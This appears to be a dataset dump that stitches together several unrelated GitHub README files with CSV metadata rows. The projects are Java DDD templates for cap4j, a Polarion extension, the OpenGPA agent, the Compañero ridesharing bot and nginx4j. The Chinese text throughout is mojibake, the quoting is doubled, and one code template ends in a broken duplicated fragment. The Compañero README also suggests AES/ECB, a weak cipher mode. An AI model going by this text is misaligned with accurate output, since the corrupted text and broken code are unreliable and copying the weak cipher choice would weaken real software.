> `å³æ—¶å‘é€` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity)
> 
> `å»¶æ—¶å‘é€` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity, Duration delay)
> 
> `å®šæ—¶å‘é€` DefaultDomainEventSupervisor.instance.attach(Object eventPayload, Object entity, LocalDateTime schedule)

```java
import org.netcorepal.cap4j.ddd.domain.event.impl.DefaultDomainEventSupervisor;


// ä»£ç çœç•¥...
public class Order {
    // ä»£ç çœç•¥...
    public class Order {

        // ã€è¡Œä¸ºæ–¹æ³•å¼€å§‹ã€‘

        /**
         * ä¸‹å•åˆå§‹åŒ–
         * @param items
         */
        public void init(List<OrderItem> items){
            // ä»£ç çœç•¥...
            DefaultDomainEventSupervisor.instance.attach(OrderPlacedDomainEvent.builder()
                    .orderNo(this.orderNo)
                    .amount(this.amount)
                    .orderTime(LocalDateTime.now())
                    .build(), this);
        }

        // ã€è¡Œä¸ºæ–¹æ³•ç»“æŸã€‘
        // ä»£ç çœç•¥...
    }
}
```

**é¢†åŸŸäº‹ä»¶è®¢é˜…**

é¢†åŸŸäº‹ä»¶è®¢é˜…å®šä¹‰åœ¨åº”ç”¨å±‚ï¼ˆ`application`ï¼‰ï¼Œé€šå¸¸æ”¾ç½®åœ¨ `${basePackage}.application.subscribers` åŒ…ä¸­ã€‚

é¢†åŸŸäº‹ä»¶è®¢é˜…æ”¯æŒSpringæ³¨è§£å¼å£°æ˜è®¢é˜…(ç›‘å¬)çš„æ–¹å¼ã€‚

```java

import org.springframework.context.event.EventListener;
import org.springframework.stereotype.Service;

@Service
public class OrderPlacedDomainEventSubscriber{
    @EventListener(DeliveryReceivedDomainEvent.class)
    public void onEvent(DeliveryReceivedDomainEvent event){
        // äº‹ä»¶å¤„ç†é€»è¾‘
    }
}
```


#### åº”ç”¨å±‚
##### IDEAä»£ç æ¨¡æ¿
`${basePackage}.application.commands`ä¸­çš„ç±»æ¨¡æ¿

æ¨¡æ¿åç§°ï¼š`Command`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: å‘½ä»¤æè¿°
 * 
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Command<${NAME}, ${ReturnType}>{
        private final AggregateRepository<${Entity}, Long> repo;
        private final UnitOfWork unitOfWork;

        @Override
        public ${ReturnType} exec(${NAME} cmd) {
            
            return null;
        }
    }
}
```
`${basePackage}.application.queries`ä¸­çš„ç±»æ¨¡æ¿

æ¨¡æ¿åç§°ï¼š`Query`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.Query;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: æŸ¥è¯¢æè¿°
 *
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    private Long id;
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Query<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;

        @Override
        public ${NAME}Dto exec(${NAME} param) {
            ${Entity} entity = repo.findOne(${Entity}Schema.specify(
                root -> root.id().eq(param.id)
            )).orElseThrow(() -> new KnownException(""ä¸å­˜åœ¨""));
            
            return null;
        }
    }
    
    @Data
    public static class ${NAME}Dto{
        private Long id;
        
    }
}
```

æ¨¡æ¿åç§°ï¼š`QueryList`
```java

#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.Builder;
import lombok.Data;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.ListQuery;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: æŸ¥è¯¢æè¿°
 *
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
public class ${NAME} {
    private Long id;
    
    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements ListQuery<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;

        @Override
        public List<${NAME}Dto> exec(${NAME} param) {
            List<${Entity}> list = repo.findAll(${Entity}Schema.specify(
                root -> root.id().gt(param.id)
            ));
            
            return null;
        }
    }
    
    @Data
    public static class ${NAME}Dto{
        private Long id;
        
    }
}
```

æ¨¡æ¿åç§°ï¼š`QueryPage`
```java
#if (${PACKAGE_NAME} && ${PACKAGE_NAME} != """")package ${PACKAGE_NAME};#end

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.query.PageQuery;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.netcorepal.cap4j.ddd.domain.repo.JpaPageUtils;
import org.netcorepal.cap4j.ddd.share.PageData;
import org.netcorepal.cap4j.ddd.share.PageParam;
import org.springframework.data.domain.Page;
import org.springframework.stereotype.Service;

#parse(""File Header.java"")

/**
 * todo: æŸ¥è¯¢æè¿°
 * @author binking338
 * @date ${DATE}
 */
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class ${NAME} extends PageParam {
    private Long id;

    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements PageQuery<${NAME}, ${NAME}Dto>{
        private final AggregateRepository<${Entity}, Long> repo;
    
        @Override
        public PageData<${NAME}Dto> exec(${NAME} param) {
            Page<${Entity}> page = repo.findAll(${Entity}Schema.specify(
                root -> root.id().gt(param.id)
            ), JpaPageUtils.toSpringData(param));
    
            return JpaPageUtils.fromSpringData(page, p -> UserPageDto.builder()
                .id(p.getId())
                .build());
        }
    }
    
    @Data
    @Builder
    @AllArgsConstructor
    @NoArgsConstructor
    public static class ${NAME}Dto{
        private Long id;
    
    }
}
```


#### é€‚é…å±‚
##### IDEA LiveTemplate
`acmd` é€‚é…mvcé€å‡ºå‘½ä»¤
```java

@Autowired
$Cmd$.Handler $cmd$Handler;

@Data
@NoArgsConstructor
public static class $Cmd$Request {
    // todo: æ·»åŠ å‚æ•°

    @Schema(description = ""å‚æ•°è¯´æ˜"")
    String param;

    public DeductWalletCmd toCommand() {
        return $Cmd$.builder()
                .param(param)
                .build();
    }
}
@Schema(description = ""æ¥å£è¯´æ˜"")
@PostMapping(""/$cmd$"")
public ResponseData<$ReturnType$> $cmd$(@RequestBody @Valid $Cmd$Request request) {
    $ReturnType$ result = $cmd$Handler.exec(request.toCommand());
    return ResponseData.success(result);
}
```
> Edit Template Variables æŠ€å·§
>
> cmdå‚æ•°çš„Expressionå¯ä»¥å¡«å…¥decapitalize(Cmd)

`aqry` é€‚é…mvcé€å‡ºæŸ¥è¯¢è¯¦æƒ…
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""æ¥å£è¯´æ˜"")
@GetMapping(""/$qry$"")
public ResponseData<$Qry$.$Qry$Dto> $qry$(@Valid $Qry$ param) {
        $Qry$.$Qry$Dto result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }
```
`aqryl` é€‚é…mvcé€å‡ºæŸ¥è¯¢åˆ—è¡¨
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""æ¥å£è¯´æ˜"")
@GetMapping(""/$qry$"")
public ResponseData<List<$Qry$.$Qry$Dto>> $qry$(@Valid $Qry$ param) {
        List<$Qry$.$Qry$Dto> result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }
```
`aqryp` é€‚é…mvcé€å‡ºæŸ¥è¯¢åˆ†é¡µåˆ—è¡¨
```java

@Autowired
$Qry$.Handler $qry$Handler;

@Schema(description = ""æ¥å£è¯´æ˜"")
@PostMapping(""/$qry$"")
public ResponseData<PageData<$Qry$.$Qry$Dto>> $qry$(@RequestBody @Valid $Qry$ param) {
        PageData<$Qry$.$Qry$Dto> result = $qry$Handler.exec(param);
        return ResponseData.success(result);
        }esponseData.success(result);
        }
```
### have a nice trip!",1,10,4,9.0,"['order', 'order', 'partition', 'range', 'partition', 'value', 'less', 'partition', 'range', 'partition', 'value', 'less', 'idea', 'livetemplate', 'nice', 'trip']","['partition', 'order', 'range', 'value', 'less']",9.0,"[org.apache.maven.plugins:maven-archetype-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-plugin-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,7.0,1.0
SchweizerischeBundesbahnen/ch.sbb.polarion.extension.generic,main,"[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic)
[![Bugs](https://sonarcloud.io/api/project_badges/measure?project=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic&metric=bugs)](https://sonarcloud.io/summary/new_code?id=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic)
[![Code Smells](https://sonarcloud.io/api/project_badges/measure?project=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic&metric=code_smells)](https://sonarcloud.io/summary/new_code?id=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic&metric=coverage)](https://sonarcloud.io/summary/new_code?id=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic)
[![Duplicated Lines (%)](https://sonarcloud.io/api/project_badges/measure?project=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic&metric=duplicated_lines_density)](https://sonarcloud.io/summary/new_code?id=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic)
[![Lines of Code](https://sonarcloud.io/api/project_badges/measure?project=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic&metric=ncloc)](https://sonarcloud.io/summary/new_code?id=SchweizerischeBundesbahnen_ch.sbb.polarion.extension.generic)

# Generic extension of Polarion ALM

This is a Polarion extension which provides common part to other extensions reducing code duplication.

An extension which inherits from this generic extension will automatically get following functionality:

* An ""about"" page on administrative section of Polarion with basic information about this extension
* API to manipulate settings of this extension - to read, save settings and reverting them to default values as well as getting list of settings history revisions
* API to serialize/deserialize XML data (`JAXBUtils`)
* REST application and end points giving access to settings functionality described above as well as access to extension information and version
* Swagger UI page listing information about REST API provided

## How to use

To properly inherit from this generic extension and to take advantage of all mentioned above functionality
out of the box certain steps should be done, see below.

### pom.xml

Maven's `pom.xml` should contain following content:

* Reference to parent POM (don't forget to use proper version of it):

```xml
<parent>
    <groupId>ch.sbb.polarion.extensions</groupId>
    <artifactId>ch.sbb.polarion.extension.generic</artifactId>
    <version><!-- version goes here --></version>
</parent>
```

* Specify extension context, automatic module name, discover base package and web application name in POM's properties:

```xml
<properties>
    <maven-jar-plugin.Extension-Context>pdf-exporter</maven-jar-plugin.Extension-Context>
    <maven-jar-plugin.Automatic-Module-Name>ch.sbb.polarion.extension.pdf_exporter</maven-jar-plugin.Automatic-Module-Name>
    <maven-jar-plugin.Discover-Base-Package>ch.sbb.polarion.extension.pdf_exporter</maven-jar-plugin.Discover-Base-Package>
    <maven-jar-plugin.Configuration-Properties-Prefix>ch.sbb.polarion.extension.pdf-exporter</maven-jar-plugin.Configuration-Properties-Prefix>
    <web.app.name>${maven-jar-plugin.Extension-Context}</web.app.name>
</properties>
```

* Reference or extend following build plugins:

```xml
<build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-clean-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>ch.sbb.maven.plugins</groupId>
            <artifactId>markdown2html-maven-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-dependency-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-jar-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-surefire-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.jacoco</groupId>
            <artifactId>jacoco-maven-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-javadoc-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-source-plugin</artifactId>
        </plugin>

        <plugin>
            <groupId>io.swagger.core.v3</groupId>
            <artifactId>swagger-maven-plugin</artifactId>
            <configuration>
                <outputFormat>YAML</outputFormat>
                <resourcePackages>
                    <package>ch.sbb.polarion.extension.generic.rest.controller</package>
                    <package>ch.sbb.polarion.extension.generic.rest.model</package>
                    <package>ch.sbb.polarion.extension.pdf.exporter.rest.controller</package>
                    <package>ch.sbb.polarion.extension.pdf.exporter.rest.model</package>
                </resourcePackages>
            </configuration>
        </plugin>
    </plugins>
</build>
```

### MANIFEST.MF

File `MANIFEST.MF` should be created in `src/main/resources/META-INF/MANIFEST.MF` with following content:

* Property `Bundle-Name` should contain extension name, eg.

```properties
Bundle-Name: PDF Exporter Extension for Polarion ALM
```

* Property `Require-Bundle` should list all bundles from which this extension depends, eg.

```properties
Require-Bundle: com.polarion.portal.tomcat,
 com.polarion.alm.ui,
 com.polarion.platform.guice,
 com.polarion.alm.tracker,
 org.glassfish.jersey,
 com.fasterxml.jackson,
 com.fasterxml.jackson.jaxrs,
 io.swagger,
 org.apache.commons.logging,
 slf4j.api,
 org.springframework.spring-core,
 org.springframework.spring-web
```

* If Polarion's form extension is implemented, property `Guice-Modules` should specify a class which does this, eg.

```properties
Guice-Modules: ch.sbb.polarion.extension.pdf.exporter.PdfExporterModule
```

### Setting classes

If new extension should provide functionality to manipulate its settings, settings classes should be implemented extending
`GenericNamedSettings<T extends SettingsModel>`, eg:

```java
public class CssSettings extends GenericSettings<CssModel> {
    private static final String FEATURE_NAME = ""css"";

    public CssSettings() {
        super(FEATURE_NAME);
    }

    public CssSettings(SettingsService settingsService) {
        super(FEATURE_NAME, settingsService);
    }

    @Override
    public @NotNull CssModel defaultValues() {
        return CssModel.builder().css(ScopeUtils.getFileContent(""default/dle-pdf-export.css"")).build();
    }
}
```

...and settings model class from example above like this:

```java
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
@ToString
@EqualsAndHashCode(callSuper = false)
@JsonInclude(JsonInclude.Include.NON_NULL)
public class CssModel extends SettingsModel {

    public static final String CSS = ""CSS"";

    private String css;

    @Override
    protected String serializeModelData() {
        return serializeEntry(CSS, css);
    }

    @Override
    protected void deserializeModelData(String serializedString) {
        css = deserializeEntry(CSS, serializedString);
    }
}
```

### REST application

REST application class should inherit from `GenericRestApplication` of generic extension,
registering settings classes and extending classes of REST controller, web application filters and exception mappers:

```java
public class PdfExporterRestApplication extends GenericRestApplication {
    private final Logger logger = Logger.getLogger(PdfExporterRestApplication.class);

    public PdfExporterRestApplication() {
        logger.debug(""Creating PDF-Exporter REST Application..."");

        try {
            NamedSettingsRegistry.INSTANCE.register(
                    Arrays.asList(
                            new StylePackageSettings(),
                            new HeaderFooterSettings(),
                            new CssSettings(),
                            new LocalizationSettings(),
                            new CoverPageSettings(),
                            new FileNameTemplateSettings()
                    )
            );
        } catch (Exception e) {
            logger.error(""Error during registration of named settings"", e);
        }

        logger.debug(""PDF-Exporter REST Application has been created"");
    }
...
}
```

### UI servlet class

If new extension will contain UI parts/pages/artifacts, UI servlet class should be created extending `GenericUiServlet`
simply specifying servlet name in constructor:

```java
public class PdfExporterAdminUiServlet extends GenericUiServlet {

    @Serial
    private static final long serialVersionUID = -6337912330074718317L;

    public PdfExporterAdminUiServlet() {
        super(""pdf-exporter-admin"");
    }
}
```

### Custom extension configuration

In order to register additional configuration properties a subclass of `ExtensionConfiguration` must be marked with the `@Discoverable`:

```java
@Discoverable
public class PdfExporterExtensionConfiguration extends ExtensionConfiguration {
    @Override
    public @NotNull List<String> getSupportedProperties() {
        List<String> supportedProperties = new ArrayList<>(super.getSupportedProperties());
        supportedProperties.add(""weasyprint.service"");
        ...
        return supportedProperties;
    }
    ...
}
```
",31,1,5,148.0,"['generic', 'extension', 'polarion', 'alm', 'how', 'use', 'set', 'class', 'rest', 'application', 'ui', 'servlet', 'class', 'custom', 'extension', 'configuration']","['extension', 'class', 'generic', 'polarion', 'alm']",2.0,"[ch.sbb.maven.plugins:markdown2html-maven-plugin,io.swagger.core.v3:swagger-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jacoco:jacoco-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,1.0,1.0
eschnou/OpenGPA,main,"# OpenGPA - (Open) Agentic is all you need ğŸ˜

[![Twitter Follow](https://img.shields.io/twitter/follow/opengpa?style=social)](https://twitter.com/opengpa) &ensp;
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

**OpenGPA** is an Open-source General Purpose Agent. A self-hosted solution boasting capabilities similar to
popular GPTs.

- Agentic system with multi-step-reasoning, chain-of-thought, ReAct, tool use etc
- Support for [all major LLMs](https://docs.spring.io/spring-ai/reference/api/chatmodel.html) such as LLama, Mistral, Anthropic, OpenAI, etc.
- Off-line first. You can run on your own box with a local LLM. Data won't leave the server. All the power of GPT without the data privacy nightmare.
- Extensible framework allows to plug your own actions, such as calling into internal services and APIs
- Simple UI exposing insight on the GPA internal reasoning and actions
- Free and open source, deploy anywhere, customize to your needs

<p align=""center"">
  <img src=""/assets/opengpa_ui.png"" width=""640"" />
</p>

## :pencil2: Design principles

OpenGPA is much more than a UI on top of a LLM. It implements an agentic workflow, where a LLM is used as the 
*brain* of an agent to reason through multiple steps of planning, reasoning, and tool use.  In particular, OpenGpa 
is using the [ReAct](https://arxiv.org/abs/2210.03629) approach to verbally reason on the next step, decide on the action to execute, 
and observe the outcome.

```
{
  ""reasoning"": ""The user wants to know the current weather in Liege, Belgium. 
                The best action to get this information is to perform a web search with 
                the query 'current weather in Liege, Belgium'. The result of this action 
                will then be used to respond to the user's request. 
                This is not the final action as we have to get the results from the web 
                search first.""
  ""action"": {
    ""name"": ""webSearch"",
    ""arguments"": {
      ""query"": ""current weather in Liege, Belgium""
    }
  },
  ""is_final"": false
}
```

Action selection is based on a catalog of action that can easily be extended through code. You could add an action
to tap into an internal service to fetch some data, or a workflow engine to trigger a next step, etc.

## ğŸ› ï¸ï¸ Key Features

The current version is a minimal POC yet, it already packs a few interesting pieces:
- Works with all LLM supported by [spring-ai](https://spring.io/projects/spring-ai), including running **LLama** locally
- Multi-step task processing with **chain-of-thought** approach
- Action model with easy to extend **actions** for use by the agent
- Upload of **artifacts** to process by the agent
- Download of **artifacts** generated by the agent

## ğŸš§ Roadmap

Improve the Agentic capabilities:
- **RAG** enabling the agent to consult vast volume of internal documents
- **Memory** enabling the agent to remember key facts and use them later
- **code generation** and **execution** within the agent (using Groovy scripts?)
- **remote API invocation** to tap into existing enterprise APIs
- **web interactions** allowing the agent to navigate pages submit forms
- **scheduled** jobs for automating workflow
- **triggers** to create complete end-to-end workflows

Make OpenGPA enterprise ready:
- Persistence of tasks/steps
- Proper file storage and management
- User management and access control
- Secure API access through API gateway
- Auditing of task processing costs (token usage)
- Instrumentation and observability

## ğŸš€ Getting started

### Build and run the server

If you are on a Mac, the following should be enough to get you started and running this
locally. In case of trouble, please reach out on [Discord](https://discord.gg/3XPsmCRNE2). 

> [!WARNING]
> Building requires __Java 21__. If you are on a Mac, you can easily install it
> with `brew install openjdk@21`

By default, opengpa is using OpenAI gpt-4o as its LLM. Check the `application.properties` file 
for configuration options and the spring-ai documentation to configure support for other LLMs.

```bash
mvn clean package -Pproduction
OPENAI_API_KEY=sk-*** java -jar opengpa-server/target/opengpa-server-0.1.0.jar
```

Open the UI on [http://localhost:8000](http://localhost:8000) and login with username `opengpa` and password `opengpa`.


### Debugging

For debugging purposes you can log all interactions and prompts using the following config:
```
opengpa.server.log-prompt=true
opengpa.server.log-folder=/tmp/opengpa/logs
```

# Documentation
- [Setting up an OpengGPA server](documentation/setup.md)
- [Using local open-source LLM](documentation/offline.md)
- [Creating a custom Action](documentation/actions.md)

# Support
- Join us on [Discord](https://discord.gg/3XPsmCRNE2)
- Reach out on [X](https://x.com/opengpa)
- File an [issue](https://github.com/eschnou/OpenGPA/issues) 

# License

MIT License

Copyright (c) 2024 Laurent Eschenauer

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
",1,2,4,1.0,"['opengpa', 'open', 'agentic', 'need', 'design', 'principle', 'key', 'feature', 'roadmap', 'getting', 'start', 'build', 'run', 'server', 'debug', 'documentation', 'support', 'license']","['opengpa', 'open', 'agentic', 'need', 'design']",5.0,"[com.vaadin:vaadin-maven-plugin,maven-compiler-plugin,maven-shade-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,1.0
kopytovskiy/companero-bot,master,"<div align=""center""><img width=""200"" alt=""Companero"" src=""https://companero.io/assets/images/logo/logo.png""/></div>
<br/>
<p align=""center"">
   <i>CompaÃ±ero is an open-source ridesharing and hitchhiking service. Find a travel companion without any expenses!</i>
   <br/>
   POC: <a href=""https://t.me/CompaneroBot"">https://t.me/CompaneroBot</a>
   <br/><br/>
     <b><a href=""https://companero.io"">Website</a></b>  | <b><a href=""https://t.me/CompaneroUpdates"">Public Channel</a></b> | <b><a href=""https://t.me/CompaneroChat"">Chat</a></b>
     <br/><br/>
   <a href=""https://jdk.java.net/archive/""><img src=""https://img.shields.io/badge/Java_Version-21-ffd7d7?logo=hackthebox&logoColor=fff"" alt=""JavaVersion""/></a>
   <a target=""_blank"" href=""https://github.com/kopytovskiy/companero-bot""><img src=""https://img.shields.io/github/last-commit/kopytovskiy/companero-bot?logo=github&color=ffd7d7&logoColor=fff"" alt=""Last commit""/></a>
   <img src=""https://img.shields.io/badge/PRs-Welcome-ffd7d7?&logoColor=fff"" alt=""PRs""/>   
   <a href=""https://github.com/kopytovskiy/companero-bot/blob/master/LICENSE""><img src=""https://img.shields.io/badge/License-AGPLv3-ffd7d7?logo=opensourceinitiative&logoColor=fff"" alt=""License AGPLv3""/></a>
   <br/><br/>
</p>


## Table of Contents
- [Features](#features)
- [How It Works](#how-it-works)
- [Getting started](#getting-started)
- [Our Philosophy](#our-philosophy)
- [Contributing](#contributing)
- [Sponsorship](#sponsorship)
- [License](#license)

## Features
* **Privacy**. No personal data needed to use our app.
* **Multi-language**. For now, we support 6 languages: English, Spanish, Ukrainian, Portuguese, French, German.
* **Free**. CompaÃ±ero is completely free and open-source.
* **Cross-plarform**. Use it on any device where Telegram is installed.
* **Simplicity**. Request a ride just in several clicks and all drivers near-by will recieve it.
* **Price calculation**. You can always rely on our price calculations or set your own price, even request a free ride!
* **Rating system**. Rate drivers and passengers after each ride, fostering trust and safety within our community.

## How It Works
1. You set up a profile and choose a role (driver or passenger).
2. As a passenger, you can request a ride by sending the location of the pickup point and the destination point.
3. Also, as a passenger, you can provide extra information, set a price (we also calculate a recommended one for you ğŸ¥°), and choose a pickup time.
4. If you request a ride for now, all drivers in an area of **25 kilometers** around you will receive your request.
5. If you request a ride for later, all drivers in the area of **125 kilometers** around you will receive your request.
6. As a driver, you can see the pickup point, the approximate destination point, the price, and some extra information (**not personal data**).
7. You can accept this ride request and see the user's contacts that he provided. At the pickup point, you will see the full destination address.

## Getting started
1. Generate Telegram Token, using [@BotFather](https://t.me/BotFather).
2. Run your [MongoDB](https://github.com/mongodb/mongo) database.
3. Create ""CompaneroBotDB"" database in your MondoDB. (optional step)
4. Create collection ""driversInfo"" in your ""CompaneroBotDB"" database. (optional step)
5. Create ""2dsphere"" index for ""location"" field in ""driversInfo"" collection.
6. Run CompaÃ±ero using next command: `mvn clean compile exec:java -Dexec.mainClass=com.companerobot.Main -Dbot_token=*token* -Dmongodb_client_url=*url* -Dcipher_algorithm=*algorithm* -Dcipher_key=*key*`
    * For `-Dcipher_algorithm` you can use ""AES/ECB/PKCS5Padding"" or any alternative to it.
7. Have fun ğŸ˜‰

## Our Philosophy
1. We believe in kindness and the power of human connection.
2. We believe that travel should be accessible to all, regardless of economic status.
3. We believe in environmentally conscious travelling approach and one of our aims is to reduce carbon footprints.
4. We believe that simplicity is a key.

## Contributing
We welcome contributions to our project! Here are some ways you can help:
* ğŸ› Report bugs or suggest features
* ğŸ’» Submit pull requests
* ğŸ™‹â€â™‚ï¸ Vote for new features in our [public channel](https://t.me/CompaneroUpdates)
* ğŸ” Perform code reviews
* ğŸ“– Improve documentation
* ğŸ§ª Add or improve tests
* ğŸŒ Help with translations
* ğŸ¤ Provide support in discussions
* ğŸš€ Share the project
* â­ Star us on GitHub â€” it motivates us a lot!

A huge thank you to everyone who is helping to improve CompaÃ±ero. Thanks to you, the project can evolve!

### Our Contributors

<a href=""https://github.com/kopytovskiy""><img src=""https://avatars.githubusercontent.com/u/17334798?v=4"" width=""50"" height=""50"" alt=""""/></a>

## Sponsorship

I don't ask for donations for this project, but I kindly request your support for Ukraine during these tough times ğŸ‡ºğŸ‡¦

The country and its people are facing a humanitarian disaster and need our help. If you find this project useful, please consider making a donation to reputable organizations providing aid to Ukraine. Every contribution, no matter how small, can make a significant difference. 

You can choose any fund you like or make a donation at [savelife.in.ua](https://savelife.in.ua/en/donate-en/). 

Thank you for your compassion and generosity ğŸ™

## License

This project is licensed under the GNU Affero General Public License v3.0 - see the [LICENSE](LICENSE) file for details.",3,0,3,10.0,"['table', 'content', 'feature', 'how', 'it', 'work', 'get', 'start', 'our', 'philosophy', 'contribute', 'our', 'contributor', 'sponsorship', 'license']","['our', 'table', 'content', 'feature', 'how']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-surefire-report-plugin]",0.0,1.0,0.0
houbb/nginx4j,master,"# é¡¹ç›®ç®€ä»‹

nginx4j æ˜¯åŸºäº netty å®ç°çš„ nginx çš„java ç‰ˆæœ¬ã€‚

[![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.github.houbb/nginx4j/badge.svg)](http://mvnrepository.com/artifact/com.github.houbb/nginx4j)
[![Build Status](https://www.travis-ci.org/houbb/nginx4j.svg?branch=master)](https://www.travis-ci.org/houbb/nginx4j?branch=master)
[![Coverage Status](https://coveralls.io/repos/github/houbb/nginx4j/badge.svg?branch=master)](https://coveralls.io/github/houbb/nginx4j?branch=master)

å¦‚æœä½ æƒ³çŸ¥é“ servlet å¦‚ä½•å¤„ç†çš„ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼š

>  [ç®€æ˜“ç‰ˆ tomcat](https://github.com/houbb/minicat)

# ç‰¹æ€§

- å®Œå…¨å…¼å®¹ nginx.conf çš„é…ç½®æ–‡ä»¶æ ¼å¼

- åŸºäº netty çš„ nio é«˜æ€§èƒ½å¤„ç†

- é™æ€ç½‘èµ„æºæ”¯æŒ

- é»˜è®¤ index.html

- 404

- æ–‡ä»¶å¤¹çš„è‡ªåŠ¨ç´¢å¼•

- å¤§æ–‡ä»¶çš„ä¸‹è½½æ”¯æŒ

- gzip å‹ç¼©

- sendfile é›¶æ‹·è´ç‰¹æ€§

- http keep-alive ç‰¹æ€§

- æ”¯æŒå¤š server 

- è¯·æ±‚å¤´çš„ä¿®æ”¹+å“åº”å¤´çš„ä¿®æ”¹

- å¸¸è§å ä½ç¬¦ `$` çš„å†…ç½®æ”¯æŒ

